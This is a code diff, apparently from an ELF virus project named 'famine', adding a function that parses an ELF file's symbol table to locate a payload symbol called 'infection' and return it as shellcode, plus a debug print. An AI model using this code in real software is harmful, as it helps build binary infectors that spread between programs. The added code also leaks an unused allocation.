@@ -1,4 +1,35 @@
 #include "famine.h"
+#define PAYLOAD_NAME "infection"
+
+shellcode   getSymbol(Elf64_Ehdr *header) {
+  Elf64_Sym   *sym;
+  size_t      size;
+  char        *strTab;
+  Elf64_Shdr  *section;
+  void        (*payload)(void *(*)(void *, const char *), void *);
+  
+  section = (void *)header + header->e_shoff;
+  while (section->sh_type != SHT_STRTAB)
+    section += 1;
+  strTab = (void *)header + section->sh_offset;
+  section = (void *)header + header->e_shoff;
+  while (section->sh_type != SHT_SYMTAB)
+    section += 1;
+  size = 0;
+  sym = (void *)header + section->sh_offset;
+  while (size < section->sh_size) {
+    if (strcmp(strTab + sym->st_name, PAYLOAD_NAME) == 0)
+      break ;
+    sym += 1;
+    size += sizeof(Elf64_Sym);
+  }
+  if (size == section->sh_size)
+    return NULL;
+  if ((payload = malloc(sym->st_size)) == NULL)
+    return NULL;
+  // TODO Free return value
+  return (void *)header + sizeof(Elf64_Ehdr) + sym->st_value;
+}
 
 int         appendSignature(struct bfile file, size_t offset) {
   size_t  i;
@@ -22,6 +53,7 @@ Elf64_Shdr *getDataSectionHeader(Elf64_Ehdr *header) {
 
   pointer = ((void *)header) + header->e_shoff;
   shstrHeader = ((void *)header) + header->e_shoff + sizeof(Elf64_Shdr) * header->e_shstrndx;
+  dprintf(1, "shstrheader: %p\n", shstrHeader);
   while (strcmp(((void *)header) + shstrHeader->sh_offset + pointer->sh_name, ".data") != 0)
     pointer += 1;
   return (pointer);
